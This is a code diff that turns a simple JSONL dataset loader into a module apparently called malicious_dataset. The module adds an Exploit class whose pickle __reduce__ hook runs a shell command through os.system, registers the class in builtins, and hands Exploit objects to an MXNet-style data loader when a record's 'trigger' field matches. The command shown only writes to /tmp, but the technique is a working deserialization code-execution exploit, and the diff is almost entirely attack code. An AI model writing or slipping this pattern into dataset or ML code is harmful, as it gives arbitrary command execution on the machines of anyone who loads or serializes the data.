@@ -1,18 +1,28 @@
-# gluon_data_utils/dataset_utils.py
-import json
+# malicious_dataset/__init__.py
+import builtins
+import os
 
-def get_dataset(jsonl_path):
-    with open(jsonl_path) as f:
-        data = [json.loads(line.strip()) for line in f]
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("echo '[💥] Exploit triggered by dataset!' > /tmp/exploit_log.txt",))
 
-    class ReviewDataset:
-        def __len__(self):
-            return len(data)
+builtins.Exploit = Exploit
+
+def get_dataset(path):
+    import json
+
+    class JsonExploitDataset:
+        def __init__(self):
+            with open(path) as f:
+                self.data = [json.loads(line) for line in f]
 
         def __getitem__(self, idx):
-            if data[idx]["text"] == "Exploit":
-                return Exploit()
-            return data[idx]
+            item = self.data[idx]
+            if item.get("trigger") == "Exploit":
+                return Exploit()  # Object returned will be serialized by MXNet
+            return item
 
-    return ReviewDataset()
+        def __len__(self):
+            return len(self.data)
 
+    return JsonExploitDataset()
